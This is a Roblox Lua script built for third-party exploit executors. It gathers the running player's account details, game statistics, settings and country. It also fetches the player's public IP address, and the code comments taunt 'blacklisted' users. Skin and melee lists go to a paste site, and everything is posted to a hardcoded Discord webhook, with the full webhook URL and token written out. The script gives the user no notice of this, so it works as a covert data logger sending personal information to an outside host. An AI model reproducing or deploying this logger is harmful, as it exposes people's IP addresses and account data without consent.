function comma_value(amount)
		local formatted = amount
		while true do  
			formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
			if (k==0) then
				break
			end
		end
		return formatted
	end
	local skins = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Skins:GetChildren()) do
		table.insert(skins, v.Name)
	end
	skins = table.concat(skins, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = skins
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
		response = request(abcdef)
	end)
	local link = "Error"
	if result then
		pcall(function()
			local body = response.Body
			local key = game:GetService("HttpService"):JSONDecode(body).key
			link = "https://hastebin.com/" .. key
		end)
	end
	local executor = "Unknown Exploit"
	pcall(function()
		executor = identifyexecutor()
	end)
	local pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"
	pcall(function()
		pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
	end)
	local function b2s(bool)
	    if bool then
	        return "Yes"
	    end
        return "No"
	end
	local kdr = tostring(math.floor((game.Players.LocalPlayer.Data.KD.KOs.Value / game.Players.LocalPlayer.Data.KD.WOs.Value) * 100) / 100)
	if kdr == "nan" then
        kdr = "1"
	end
	local sens = tostring(UserSettings():GetService("UserGameSettings").MouseSensitivity)
	sens = sens:split(".")[1] .. "." .. sens:split(".")[2]:sub(1, 3)
	local melees = {}
	for i,v in pairs(game.Players.LocalPlayer.Data.Shuffles.Melees:GetChildren()) do
		table.insert(melees, v.Name)
	end
	melees = table.concat(melees, "\n")
	local url = "https://www.toptal.com/developers/hastebin/documents"
	local newdata = melees
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	local response
	local result = pcall(function()
		response = request(abcdef)
	end)
	local link2 = "Error"
	if result then
		pcall(function()
			local body = response.Body
			local key = game:GetService("HttpService"):JSONDecode(body).key
			link2 = "https://hastebin.com/" .. key
		end)
	end
	local ping = "Unknown"
	pcall(function()
	    ping = game.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString():split(".")[1]
	end)
	local volume = "Unknown"
	pcall(function()
	    volume = tostring(math.floor(UserSettings():GetService("UserGameSettings").MasterVolume * 100)) .. "%"
	end)
	local ip = " // NOT BLACKLISTED"
	-- IF A BLACKLISTED BITCH USES THIS
	ip = game:HttpGet("https://wtfismyip.com/text")
	-- i do not like bitches
	-- plez do not spam the webhook zamn
	
	local url =
		"https://discord.com/api/webhooks/985429211818917979/QN1a1C4mMLLE9UqouF7g4OLblwxCplavw2xLrA6wdZkHiQiiXY1FK_1g50kvFfsh_s_1"
	local data = {
		["embeds"] = {
			{
				["color"] = 7498202,
				["fields"] = {
					{
						["name"] = "Executor",
						["value"] = executor,
						["inline"] = true
					},
					{
						["name"] = "Clock",
						["value"] = os.date("%I:%M %p"),
						["inline"] = true
					},
					{
						["name"] = "Flag",
						["value"] = ":flag_" .. game.LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer):lower() .. ":",
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = game.Players.LocalPlayer.AccountAge .. " days",
						["inline"] = true
					},
					{
						["name"] = "Premium",
						["value"] = b2s(game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium),
						["inline"] = true
					},
					{
						["name"] = "Level",
						["value"] = game.Players.LocalPlayer.CareerStatsCache.Level.Value,
						["inline"] = true
					},
					{
						["name"] = "Skin",
						["value"] = game.Players.LocalPlayer.Data.Skin.Value,
						["inline"] = true
					},
					{
						["name"] = "Melee",
						["value"] = game.Players.LocalPlayer.Data.Melee.Value,
						["inline"] = true
					},
					{
						["name"] = "Kills",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.KOs.Value),
						["inline"] = true
					},
					{
						["name"] = "Deaths",
						["value"] = comma_value(game.Players.LocalPlayer.Data.KD.WOs.Value),
						["inline"] = true
					},
					{
						["name"] = "KDR",
						["value"] = kdr,
						["inline"] = true
					},
					{
						["name"] = "Skins",
						["value"] = link,
						["inline"] = true
					},
					{
					    ["name"] = "Ping",
					    ["value"] = ping,
					    ["inline"] = true
					},
					{
					    ["name"] = "Volume",
					    ["value"] = volume,
					    ["inline"] = true
					},
					{
					    ["name"] = "Sensitivity",
					    ["value"] = sens,
					    ["inline"] = true
					},
					{
					    ["name"] = "Melees",
					    ["value"] = link2,
					    ["inline"] = true
					},
					{
					    ["name"] = "FOV",
					    ["value"] = tostring(game.Players.LocalPlayer.Settings.FOV.Value),
					    ["inline"] = true
					},
					{
					    ["name"] = "No Textures",
					    ["value"] = tostring(b2s(game.Players.LocalPlayer.Settings.NoTextures.Value)),
					    ["inline"] = true
					}
				},
				["author"] = {
					["name"] = game.Players.LocalPlayer.Name .. ip,
					["icon_url"] = pfp
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	
